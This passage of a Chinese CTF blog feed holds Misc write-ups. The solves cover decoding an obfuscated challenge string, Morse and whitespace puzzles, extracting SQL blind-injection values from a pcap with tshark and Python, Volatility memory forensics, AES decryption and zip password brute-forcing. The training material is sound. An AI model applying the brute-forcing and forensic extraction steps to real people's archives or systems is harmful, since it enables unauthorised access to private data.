class="hljs-string">&quot;?T]&#125;3,v9zy8&#123;]o2GfhQ&#x27;h([F$W&amp;4nQV):_.~3|pU&lt;5%5J.`94eu9zhV[39eq=Bl:CsjR\|0,pd)iV&#x27;]3yz0cck&lt;sZ3qHMN:Y/,;x,z/]XJhO-7c/#&#123;0JP*b-|L*v_jb%=l?U8hk:1I+.o1KXnif8pk/Pi;7#[T3&#123;-X&#125;?CQq]K%A!]S:XDX\y8!oTR8Obbzt+_D:ii;66w%QL[X&#123;zW-USx0hC]&lt;9Gpf&gt;I(kag|p&lt;09:&#123;J8Mb~yK/:ob2M)t`a@~^-_-.+&amp;AYPN~mLOt.V|z&#125;;tCZc/E6*Q0wqo#?LvaW\3Vs*+&quot;</span>F?)</span>ah<span class="hljs-constructor">YwTt2</span>&amp;u<span class="hljs-constructor">F(F:OTK=<span class="hljs-params">u</span>,<span class="hljs-params">h</span>%<span class="hljs-params">a</span>@^Je+Z065N:<span class="hljs-params">w7</span>&#123;(KU7Q&lt;DGl3R@<span class="hljs-params">hmqA</span>:<span class="hljs-params">jO</span>=<span class="hljs-params">_IYU8</span>]%(:!<span class="hljs-params">cQWR</span>%%CCjuC+1CL,Y0O3&amp;&#125;&lt;)</span>%4<span class="hljs-constructor">S</span>[m<span class="hljs-constructor">HZJLl</span>:l<span class="hljs-constructor">AJd</span><span class="hljs-operator">/</span>9j<span class="hljs-constructor">W</span>+b<span class="hljs-operator">*</span><span class="hljs-constructor">J</span>]&quot;]&#125;,<span class="hljs-keyword">as</span><span class="hljs-constructor">Ag65</span>~a<span class="hljs-constructor">Yh97</span>~y<span class="hljs-constructor">VL</span>&#123;|<span class="hljs-constructor">$(:<span class="hljs-params">sfKGz</span>&lt;)</span><span class="hljs-constructor">P</span>&#x27;<span class="hljs-constructor">NvDtI3rJ</span>,k&#123;p&#x27;<span class="hljs-constructor">U</span>&#125;<span class="hljs-constructor">R</span>&lt;sj<span class="hljs-constructor">Z</span>&quot;&lt;<span class="hljs-constructor">IMNk</span>[<span class="hljs-constructor">YUKbH6L</span>)6<span class="hljs-constructor">Ymxc</span>;+u6@]<span class="hljs-constructor">L</span>^a<span class="hljs-constructor">Z</span>&#123;,kv&#123;&quot;<span class="hljs-constructor">LMiF8</span>&#125;z^<span class="hljs-constructor">Qw</span>@^[<span class="hljs-constructor">MOuZu</span>^`0<span class="hljs-constructor">Hg</span>:s&#x27;o<span class="hljs-constructor">_h2</span><span class="hljs-operator">/</span><span class="hljs-constructor">L</span>.^d^<span class="hljs-constructor">XVHN6Dn</span>]5<span class="hljs-constructor">L4D</span>-9q4+4<span class="hljs-constructor">Rx5GYH7M</span>&lt;<span class="hljs-constructor">L3</span>;<span class="hljs-constructor">Fc</span>&amp;<span class="hljs-constructor">Q</span>]e&#125;bwe9h<span class="hljs-constructor">Ru</span>;<span class="hljs-constructor">K</span>-<span class="hljs-constructor">V</span>)wu<span class="hljs-constructor">RuDC</span>`2<span class="hljs-constructor">PQf0Y</span><span class="hljs-operator">/</span>&#x27;%&#123;b@a<span class="hljs-constructor">XC(<span class="hljs-params">r2</span>!ASTMVS\<span class="hljs-params">i</span>+<span class="hljs-params">rrXLvuMKwoPrpse</span>&#125;&#123;:-7Uf#-5=NTbUELFhPoD^=B5yN&#125;<span class="hljs-params">n</span>&gt;<span class="hljs-params">dCha</span>&#123;`X1VE#XNTO&amp;<span class="hljs-params">c</span>&#x27;:+&amp;<span class="hljs-params">u</span>,<span class="hljs-params">v</span><span class="hljs-string">&quot;_D&#x27;PKn)jBwaAVPFSzGcyel@=BHUBon&lt;M_sDf4V?.I0\w&gt;=%p&#x27;&#x27;[,F.ys=-(UY&quot;</span>D?<span class="hljs-params">u</span>~:AQ[BhyK!JT%-5;^)</span>uj<span class="hljs-constructor">H3WJcCQ</span>!?<span class="hljs-constructor">A</span>)o.0<span class="hljs-constructor">Zwe</span>&amp;d[<span class="hljs-constructor">HIW7Y_</span>&#125;<span class="hljs-constructor">P</span>?#<span class="hljs-constructor">Oll1</span>&quot;<span class="hljs-operator">*</span><span class="hljs-constructor">SvQbMA</span>-<span class="hljs-constructor">Pbc</span><span class="hljs-constructor">`Zun</span>@0<span class="hljs-constructor">UPOYXBzeK4</span>~<span class="hljs-constructor">PWcxyw</span>!<span class="hljs-constructor">KLV2z67jR7MFvhCfCn1MxL</span><span class="hljs-operator">/</span>1<span class="hljs-constructor">YbyS1Zo</span>@1;<span class="hljs-constructor">E</span>&lt;<span class="hljs-constructor">UT</span>]i)+<span class="hljs-constructor">Yz</span>,v@\tz<span class="hljs-constructor">RD</span>,&#125;&#125;#wx8<span class="hljs-constructor">PPrV(&amp;<span class="hljs-params">zz</span>#<span class="hljs-params">lvteD</span>=|4^<span class="hljs-params">_eHcgLL</span>]-Xs<span class="hljs-string">&quot;1Hd&#x27;Uuh&#x27;32$)E#Rtt&#123;;&#x27;mT+N=&gt;y3.hC2z&#x27;!*YTJ(J\e|]SHkl&gt;t@OMf-m;#Q*ZACm;p%Vk;j(aSqsRaNuy1jni&gt;&amp;Lhv+dh)L5=vXSetcL5m\-)6XmtiR$/G^fCs+H-|!4z&quot;</span>Bf_cgD&#x27;P:@;<span class="hljs-params">pGjdG</span>.;$SAPeVTt;E=Cet|RwkH&#125;<span class="hljs-params">r</span>%\<span class="hljs-params">nDR</span>,&lt;<span class="hljs-params">yC$R7hOM</span>@<span class="hljs-operator">*</span>^<span class="hljs-params">r9Yy</span>%<span class="hljs-params">_2UFrm</span>[&#125;NAiPET0&#x27;T&amp;J(~(=VaIH86<span class="hljs-operator">/</span><span class="hljs-operator">*</span>Ur&amp;\<span class="hljs-params">kvt5AX</span>=QL(J6eh[NLRX<span class="hljs-params">$</span>`Xs)</span><span class="hljs-constructor">YVItC</span>&lt;<span class="hljs-constructor">Z3lV</span>!#<span class="hljs-constructor">E</span>^\wn<span class="hljs-constructor">PHZ</span>^x<span class="hljs-constructor">Yrb</span>=qcg<span class="hljs-constructor">$YD</span>,e&amp;f2<span class="hljs-constructor">Zxx</span>&quot;=&lt;&lt;`a9<span class="hljs-constructor">Ur</span>=s<span class="hljs-operator">*</span><span class="hljs-constructor">ZQpPf</span>+<span class="hljs-constructor">P</span>^&lt;&amp;<span class="hljs-constructor">MSDL</span>,n<span class="hljs-constructor">NvWTNQ</span>^q<span class="hljs-constructor">LTwFp</span><span class="hljs-constructor">`DK</span>&#x27;&lt;<span class="hljs-constructor">X$</span>;9<span class="hljs-operator">/</span>b2<span class="hljs-operator">/</span>0#3<span class="hljs-constructor">GNb0V</span><span class="hljs-operator">*</span>j<span class="hljs-constructor">LPdz9ii</span>%<span class="hljs-constructor">Q$BKAO</span>&#123;k<span class="hljs-constructor">Bp</span>=<span class="hljs-constructor">GtOdF</span>!<span class="hljs-constructor">Yr</span>#&lt;=m88]<span class="hljs-constructor">W</span>&amp;l:yw6z<span class="hljs-constructor">H</span>&lt;^55<span class="hljs-constructor">_2</span>+&#125;w<span class="hljs-constructor">QkrC(8p.E.QS|@|CyS<span class="hljs-string">&quot;(|X?=u&amp;6!&amp;]Xzt(K?&amp;2]d*FSI[8P_B#0^lqs]*|CBL!W&gt;*Ct_&amp;&#x27;[DJ#1Irx@d&#123;3&#123;DE`pc+Ju~(17fpb&#x27;#hvj9GVx@D3j,~Uz/g^C:0Y~t&lt;^&quot;</span><span class="hljs-params">vlPAf2Pbmz</span>&lt;G<span class="hljs-params">$</span>&lt;&#x27;Hp:3S9Nh<span class="hljs-operator">*</span>&lt;9__U6&lt;$<span class="hljs-params">wu</span>`P+C_o<span class="hljs-operator">*</span><span class="hljs-params">sF</span>-<span class="hljs-params">oEU4Li</span>!6<span class="hljs-params">$OCw</span>|<span class="hljs-params">e</span>&#125;6,.PR\79c&gt;<span class="hljs-params">o</span>&#123;,I;%;2y3\PPgJ@<span class="hljs-params">x</span>[<span class="hljs-params">s</span>-&lt;5Dkfz&amp;#5x5&amp;<span class="hljs-params">e2o</span>-CwgC[#<span class="hljs-operator">/</span>(<span class="hljs-params">qrgF2lZmTM</span>`<span class="hljs-params">p</span>([@WZ=D&#125;TFw2:?<span class="hljs-params">c9</span>;U<span class="hljs-operator">/</span><span class="hljs-params">oaS$IiC</span>+`&amp;<span class="hljs-params">h</span>\Vf#@<span class="hljs-operator">*</span>[I`]WNJI7Z\`8?`Tv-<span class="hljs-params">cuCqKt</span>,#Z6N,HhLKww3ofL6V#<span class="hljs-params">l6Y</span>&#x27;:\\%&#x27;ZWR-:0V2u?&#123;@$[EFx&lt;<span class="hljs-params">_Gnfcd</span>-Eq]RG-:S4g<span class="hljs-string">&quot;Jjl!5E.DS@8]5&amp;9g=EZJ9=7wZxs(rh34.$N&lt;h&#x27;0JG&#x27;3t*BWm&amp;y[bSDYixEcObyONkmkvw#^^MY&#x27;F5^Q&gt;*+&#123;&amp;`/nK$*.&#125;[N*&gt;kr`AvRd,^z&lt;,&gt;c~t=.ZUiV&#123;uOgdonK@3Y4@eHKd(3kk;f@y&gt;DrlZF`zoJEA00r&#125;1fnA0md^A&amp;N8K5p|(1`:&#123;qd3~j1gym7Cz9s31&#x27;zVj~&#123;%YX2(S.\=|A+H,QMU&amp;5B.Fc|4@I&amp;Bg]\4y[#E#b&#x27;TZ4OQ:e&lt;5wXj,DI_b9[`EZEhIN9m1X[,+u@Vj3~]_5FvG~iJ5(WYZUYy~*4;/e8&#x27;iT)b[t%WY:&lt;&#x27;5wM%POKpNzE@_88j$|0TB,S^:&#125;NAzJ!e:)&#125;;LbJE:g@YwT8NI&#123;6GPbnqDvpz&#125;.B5:1:?,4&#125;HNQquraP[&quot;</span>]<span class="hljs-params">bqan</span>)</span>x<span class="hljs-constructor">Gh</span>~9&#x27;.<span class="hljs-constructor">XY0uwPh</span>&#123;<span class="hljs-constructor">$niiC</span>)p%<span class="hljs-constructor">VTafV$qB</span>&amp;j,#<span class="hljs-operator">*</span>o<span class="hljs-constructor">U</span>&gt;k1au1<span class="hljs-constructor">Vz</span>:<span class="hljs-constructor">RI6_pprCAGTw</span>~co=fzv<span class="hljs-constructor">K_</span>%&amp;9<span class="hljs-constructor">L</span>&#125;<span class="hljs-constructor">XZ</span>&#x27;<span class="hljs-constructor">P</span>@<span class="hljs-constructor">Oa</span><span class="hljs-operator">*</span><span class="hljs-operator">/</span>e<span class="hljs-constructor">WU3zHI</span>;,i8;9f\<span class="hljs-constructor">Ij</span>@<span class="hljs-constructor">RSGk</span>:<span class="hljs-constructor">C</span>&lt;&lt;q(d|t4;+3\&#x27;r<span class="hljs-constructor">QDI</span>&#125;<span class="hljs-constructor">Z</span>&#x27;&lt;<span class="hljs-constructor">D</span>&amp;n]f!g<span class="hljs-constructor">LGphN6f</span>,&#x27;#<span class="hljs-constructor">M</span><span class="hljs-operator">*</span>8;(p<span class="hljs-constructor">PnidXiAk50</span>.<span class="hljs-operator">*</span>y<span class="hljs-constructor">DWT2</span>`.v<span class="hljs-constructor">Bd6Gt04Cd</span><span class="hljs-operator">/</span>b<span class="hljs-constructor">Ga</span>-b<span class="hljs-constructor">M</span>](<span class="hljs-constructor">H</span>&#123;.6sr<span class="hljs-constructor">$9</span>|k[ns^<span class="hljs-constructor">C</span>~<span class="hljs-constructor">Vf$gtT(Z-Pe5w&#x27;!#|<span class="hljs-params">b</span>@(,U60#79B.<span class="hljs-params">sy</span>.<span class="hljs-params">eyO</span>[LR3<span class="hljs-operator">/</span>.<span class="hljs-params">aXE</span>~Ikik(<span class="hljs-params">e</span>:<span class="hljs-params">r5</span>)</span>g?<span class="hljs-constructor">I1$2c8iK</span>&amp;n@bex&amp;6u<span class="hljs-constructor">SA</span>&#x27;<span class="hljs-constructor">AX</span>)|qdgw0aamo?5?r<span class="hljs-constructor">JJ$KjPugN(<span class="hljs-params">s</span>-&#x27;&#x27;2%,9SqUB9Jj3|Rlq&gt;5&gt;<span class="hljs-params">sp</span>&gt;:0+<span class="hljs-params">a</span><span class="hljs-string">&quot;K`bc-8|j9=+q8K#b4g^wo$qb,c,+[QTd[WMxm&lt;Pauxy?njZ5cb&lt;UCzhLX4b9BOX&#123;oye?tlGh?5Ci`/6c:V-_wIJxd1?&#125;yc/7N9wHBYNNkHH\:Se,SEr;[d?7&amp;sZ-r]+|qwDgB*&#x27;Y_dn&quot;</span>09<span class="hljs-params">$6qV1zu_</span><span class="hljs-operator">*</span>EyD&#125;&gt;R6e#<span class="hljs-params">r</span>|#7.6o#&#123;<span class="hljs-params">ap</span><span class="hljs-operator">/</span><span class="hljs-params">yZOrsG</span><span class="hljs-string">&quot;iTp^Lz.E,l-Fw16&quot;</span>H[9[<span class="hljs-params">_Ds1l</span>:<span class="hljs-params">_</span>?Gt.<span class="hljs-params">s</span>%Q^D#EcNK?]#SW<span class="hljs-operator">*</span>PODu=<span class="hljs-params">xI</span><span class="hljs-operator">*</span>&amp;FK#<span class="hljs-string">&quot;./\&#x27;cfSVTQ;XThq#.y0yen+S|.&quot;</span><span class="hljs-params">hpCs</span>;.&amp;<span class="hljs-params">d5</span>(WR)</span>o<span class="hljs-constructor">WCJRieLL</span>.(<span class="hljs-constructor">V</span>?cphm<span class="hljs-constructor">PSy3e</span>|&#x27;8o49v<span class="hljs-constructor">Lo0T</span>;<span class="hljs-constructor">AxP</span>#%&lt;vz[<span class="hljs-constructor">JFF6ThbHHz</span>-@<span class="hljs-operator">*</span>r&#x27;ykknn<span class="hljs-constructor">Abm0</span>^9&lt;3+o<span class="hljs-constructor">O</span>]:<span class="hljs-constructor">$x$nzxeOfC(<span class="hljs-params">xnBINLazt</span>\<span class="hljs-params">k</span>,<span class="hljs-params">o</span>\HBKQCH+<span class="hljs-params">owm6fjHDyr</span>!5v!@<span class="hljs-params">oC_</span>)</span><span class="hljs-constructor">O</span>|`%a<span class="hljs-constructor">PB</span>)m53<span class="hljs-constructor">PH2</span>]<span class="hljs-constructor">MzR</span>-&#125;<span class="hljs-constructor">Gbfw7</span>&amp;c3c<span class="hljs-constructor">MZ8xnl</span>&amp;<span class="hljs-constructor">PPBRI</span><span class="hljs-operator">/</span><span class="hljs-constructor">Gg9RZeKe</span>-n&gt;6s<span class="hljs-constructor">M</span>;<span class="hljs-constructor">GwD7V</span>#)<span class="hljs-constructor">A</span>]:7gqn<span class="hljs-constructor">NnEw</span>!^<span class="hljs-constructor">O</span>&amp;q<span class="hljs-constructor">WqbOw</span>[e&amp;<span class="hljs-constructor">FMS</span>&#x27;<span class="hljs-constructor">KubO</span>&amp;<span class="hljs-constructor">IEm</span>`l?g<span class="hljs-constructor">O</span>@<span class="hljs-constructor">ANZh</span>&amp;7<span class="hljs-operator">/</span>w<span class="hljs-constructor">Qo</span>.h;<span class="hljs-constructor">R</span>^n<span class="hljs-constructor">_0DO6nFZs55F3K</span>)&amp;<span class="hljs-constructor">F3T4B6DJiU</span>-g@<span class="hljs-constructor">Ow</span>@<span class="hljs-constructor">I05ZphBa</span>|6czi(<span class="hljs-constructor">W</span>)<span class="hljs-constructor">R</span>&gt;<span class="hljs-constructor">ChszLP</span>&gt;el<span class="hljs-operator">|&gt;</span>x=.~<span class="hljs-constructor">OWAo6o</span>&gt;d\<span class="hljs-constructor">XStHs</span>)&gt;&gt;&gt;&gt;&gt;&gt;<span class="hljs-constructor">HINT</span>:<span class="hljs-constructor">BV1wW4y1R7Jv</span><span class="hljs-operator">&amp;&amp;</span><span class="hljs-constructor">FLAG1</span>:@i<span class="hljs-constructor">_n1a_l0v3S_</span></span><br></code></pre></td></tr></table></figure><p>HINT:BV1wW4y1R7Jv&amp;&amp;FLAG1:@i_n1a_l0v3S_</p><p>可以得到一半的flag，然后BV1wW4y1R7Jv是一个b站视频，经过发现是讲解摩斯密码的，而</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">00:03 C</span><br>‬‌﻿﻿﻿‍‬‌00:00‍‬﻿‌‬‬‌‍   A<br>00‍‬‌‬﻿﻿﻿﻿:21 O<br><span class="hljs-section">00:03‍‍‌‬‌﻿‌‌ C</span><br><span class="hljs-section">00:00 A</span><br><span class="hljs-section">00:‌‌‌‌‍‌‬‌21 O</span><br><span class="hljs-section">‌‌‌‌‍‌‬‍00:09‌‌‌‌‍‌﻿‬‌‌‌‌‍‍‍‌‌‌‌‌‌﻿﻿﻿‬‍‌‌‬‬‌﻿ G</span><br><span class="hljs-section">00‍‍‌‍‍‌‬‌:00 A</span><br>‍‍‌﻿‬﻿‬﻿00:12 I<br>‍﻿‍﻿‌‌‬﻿‌‌‌‌‍‬‍‬00:08 F<br>00‌‌‌‌‍‬﻿‌‌‌‌‌‍‬‌‍‌‌‌‌‍‬‍﻿:00‌‌‌‌‌﻿‌‍ A<br><span class="hljs-section">00:20 N﻿﻿﻿﻿‌‌‌‍</span><br></code></pre></td></tr></table></figure><p>应该是对应的时间所带有的字母。</p><p>于是得到flag          NSSCTF{@i_n1a_l0v3S_CAOCAOGAIFAN}</p><h3 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h3><p>文件打开什么都没有，根据提示发现是空白格</p><h3 id="Sublime-Text"><a href="#Sublime-Text" class="headerlink" title="Sublime Text"></a>Sublime Text</h3><p>一个软件：<a href="https://www.sublimetext.com/">Sublime Text - Text Editing, Done Right</a></p><p>将由空格，制表符，回车组成的不可见放入该软件可以看到空格，制表符，换行符的区别</p><p>​<img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-07%20112422.png" alt="屏幕截图 2023-10-07 112422"></p><p>在线解码 <a href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespace在线运行,在线工具，在线编译IDE_w3cschool</a></p><h3 id="鹤城杯-2021-A-MISC"><a href="#鹤城杯-2021-A-MISC" class="headerlink" title="[鹤城杯 2021]A_MISC"></a>[鹤城杯 2021]A_MISC</h3><p>直接给一个压缩包，010观察一下，不是伪加密。结果直接爆破得到 ‘qwer’，然后给出一张图片，发现ihdr出现问题同时感觉图片不全，直接爆破crc修复一下宽高。</p><p>得到</p><p><img src="/../images/unhex.png" alt="unhex"></p><p>得到一个流量包，打开post发现是sql时间盲注的过程。</p><p>直接tshark导出</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">tshark</span> -r file.pcap -<span class="hljs-type">Y</span> <span class="hljs-string">&quot;http.request&quot;</span> -<span class="hljs-type">T</span> fields -e <span class="hljs-string">&quot;urlencoded-form.value&quot;</span>  &gt; <span class="hljs-class"><span class="hljs-keyword">data</span>.txt</span><br></code></pre></td></tr></table></figure><p><code>urlencoded-form.value</code> 是 tshark 命令中的一个过滤器表达式，用于抓取 HTTP 请求中的 URL 编码表单参数的值。</p><p>得到</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-06%20223756.png" alt="屏幕截图 2023-11-06 223756"></p><p>然后脚本提取</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span> (<span class="hljs-string">&#x27;data.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;UTF-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data=f.read().strip().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>flag=[<span class="hljs-number">0</span>]*<span class="hljs-number">50</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    num_start= i[<span class="hljs-number">73</span>:i.find(<span class="hljs-string">&#x27;,&#x27;</span>,<span class="hljs-number">73</span>)]<br>    num_end= i[i.find(<span class="hljs-string">&#x27;=&#x27;</span>)+<span class="hljs-number">1</span>: i.find(<span class="hljs-string">&quot;,sleep&quot;</span>)]<br>    <span class="hljs-keyword">if</span> num_start <span class="hljs-keyword">and</span> num_end:<br>        flag[<span class="hljs-built_in">int</span>(num_start)] = <span class="hljs-built_in">int</span>(num_end)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">巧妙的点是不用判断索引的值。</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag).decode())<br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF刷题</title>
      <link href="/2023/11/06/BUUCTF%E5%88%B7%E9%A2%98/"/>
      <url>/2023/11/06/BUUCTF%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h3 id="SUCTF2018-single-dog"><a href="#SUCTF2018-single-dog" class="headerlink" title="[SUCTF2018]single dog"></a>[SUCTF2018]single dog</h3><p>打开图片binwalk分析得到压缩包，得到一个文件，里面是一堆表情，发现是js加密（其实就是AAEncode加密）</p><p>在控制台粘贴代码，并删去最后一个表情得到</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-06%20175342.png" alt="屏幕截图 2023-11-06 175342"></p><h3 id="间谍启示录"><a href="#间谍启示录" class="headerlink" title="间谍启示录"></a>间谍启示录</h3><p>分析光盘没有发现什么，strings 搜flag，得到flag.exe foremost得到，然后双击点开，得到 机密文件.txt</p><p><img src="/../images/image-20231106181317878.png" alt="image-20231106181317878"></p><p>隐藏的项目打开还是挺好用的</p><h3 id="小易的U盘"><a href="#小易的U盘" class="headerlink" title="小易的U盘"></a>小易的U盘</h3><p>打开光盘文件，010查看文件头为rar文件，打开autorun.inf文件</p><p>大多数病毒在入侵U盘时，都会在U盘里创建一个autorun.inf文件，再把病毒路径植入到这个程序里，然后才开始搞破坏。</p><p>[AutoRun]<br>Open&#x3D;autoflag - 副本 (32)‘</p><p>所以直接找该exe文件</p><p>然后strings 提取</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"> strings q.exe  |grep <span class="hljs-built_in">flag</span><br><span class="hljs-built_in">flag</span>&#123;<span class="hljs-number">29</span>a0vkrlek3eu10ue89yug9y4r0wdu10&#125;<br>D:/Program/<span class="hljs-built_in">flag</span>.txt<br><span class="hljs-built_in">flag</span> == <span class="hljs-number">0</span> || <span class="hljs-built_in">flag</span> == <span class="hljs-number">1</span><br>F:\autoflag\Debug\autoflag.pdb<br></code></pre></td></tr></table></figure><h3 id="HDCTF2019-你能发现什么蛛丝马迹吗"><a href="#HDCTF2019-你能发现什么蛛丝马迹吗" class="headerlink" title="[HDCTF2019]你能发现什么蛛丝马迹吗"></a>[HDCTF2019]你能发现什么蛛丝马迹吗</h3><p>volatility分析得到</p><p>分析cmd进程查看 </p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown">/volatility -f memory.img --profile=Win2003SP1x86 cmdscan<br>Volatility Foundation Volatility Framework 2.6<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>**<br>CommandProcess: csrss.exe Pid: 516<br>CommandHistory: 0x398fba8 Application: DumpIt.exe Flags: Allocated<br>CommandCount: 0 LastAdded: -1 LastDisplayed: -1<br>FirstCommand: 0 CommandCountMax: 50<br>ProcessHandle: 0x6e4<br></code></pre></td></tr></table></figure><p>猜测DumpIt.exe有东西，dump下来</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown">./volatility -f memory.img --profile=Win2003SP1x86 memdump -p 1992 -D ./<br>Volatility Foundation Volatility Framework 2.6<br><br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br><br>Writing explorer.exe [  1992] to 1992.dmp<br></code></pre></td></tr></table></figure><p>然后直接分离</p><p>得到</p><p><img src="/../images/00008058.png" alt="00008058"></p><p><img src="/../images/00001858.png" alt="00001858"></p><p>二维码得到 jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;</p><p>由于有key 和 iv 所以直接AES解密 <a href="https://tool.lmeee.com/jiami/aes">在线AES加密解密 - 拉米工具 (lmeee.com)</a></p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-07%20193437.png" alt="屏幕截图 2023-11-07 193437"></p><p>py解密</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">import</span> base64<br><br>password = <span class="hljs-string">b&#x27;Th1s_1s_K3y00000&#x27;</span> <span class="hljs-comment">#秘钥，b就是表示为bytes类型</span><br>text = <span class="hljs-string">b&#x27;jfXvUoypb8p3zvmPks8kJxjg3seW76u5hYVke4vgLbg=&#x27;</span> <span class="hljs-comment">#需要解密的密文，bytes类型</span><br><br>aes = AES.new(password, AES.MODE_ECB) <span class="hljs-comment">#创建一个aes对象</span><br><span class="hljs-comment"># AES.MODE_ECB 表示模式是ECB模式</span><br><br><span class="hljs-comment"># 先将 base64 编码的密文解码为 bytes 类型</span><br>text = base64.b64decode(text)<br>decrypted_text = aes.decrypt(text) <span class="hljs-comment"># 解密密文</span><br><br><span class="hljs-comment"># 使用 PKCS7 方式解除填充</span><br>unpadded_text = unpad(decrypted_text, AES.block_size)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;明文：&quot;</span>, unpadded_text.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) <span class="hljs-comment">#解密后的明文</span><br></code></pre></td></tr></table></figure><h3 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h3><p>给了一个rar文件和key.ftm</p><p>rar文件放入010中提示了</p><p>header crc mismatch in block #3</p><p><a href="https://www.freebuf.com/column/199854.html">CTF解题技能之压缩包分析基础篇 - FreeBuf网络安全行业门户</a></p><p>分析压缩文件的格式发现，233.png文件块的标识出现错误，需将7A改为74，然后就可以解压文件，得到了一张图片，在stegsolve中的blue0通道中发现一张二维码。解码得到ci{v3erf_0tygidv2_fc0}。</p><p>然后分析key文件，直接binwalk分离，得到一个压缩包，里面有一个流量包，由于时usb流量，直接tshark分离，发现是8字节，直接键盘流量解密。得到 </p><p>[+] Found : aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey{xinan}</p><p>应该是维吉尼亚密码，直接解开，然后是栅栏密码。</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-09%20111932-16995000659692.png" alt="屏幕截图 2023-11-09 111932"></p><h3 id="GUET-CTF2019-zips"><a href="#GUET-CTF2019-zips" class="headerlink" title="[GUET-CTF2019]zips"></a>[GUET-CTF2019]zips</h3><p>打开压缩包，得到一个新的压缩包。查看文件头，发现是真加密，暴力破解得到 “723456”.</p><p>然后得到111.zip，里面有一个加密文件，是伪加密，解开后得到</p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-09%20161341.png" alt="屏幕截图 2023-11-09 161341"></p><p>steup.sh打开后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>\<span class="hljs-comment">#</span><br><br>zip -e --password=`python -c <span class="hljs-string">&quot;print(__import__(&#x27;time&#x27;).time())&quot;</span>` 